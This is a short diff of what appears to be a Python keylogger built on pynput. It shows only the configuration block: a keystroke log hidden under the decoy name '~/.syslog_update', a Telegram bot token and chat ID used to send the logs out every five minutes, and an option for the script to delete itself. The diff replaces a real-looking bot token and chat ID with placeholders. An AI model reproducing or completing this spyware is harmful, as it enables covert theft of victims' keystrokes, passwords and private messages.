@@ -10,8 +10,8 @@ from pynput import keyboard
 
 # Configuration
 LOG_FILE = os.path.expanduser("~/.syslog_update")  # Hidden log file
-TELEGRAM_BOT_TOKEN = "8069850554:AAGSURqHKfiqB_SASH16r4r82Q7Yd86RLLc"  # Replace with your bot token
-TELEGRAM_CHAT_ID = "1589606555"  # Replace with your chat ID
+TELEGRAM_BOT_TOKEN =  "YOUR_TELEGRAM_BOT_TOKEN"  # Replace with your bot token
+TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"  # Replace with your chat ID
 SEND_INTERVAL = 300  # Send logs every 5 minutes
 SELF_DELETE = False  # Set to True to delete script after execution
 
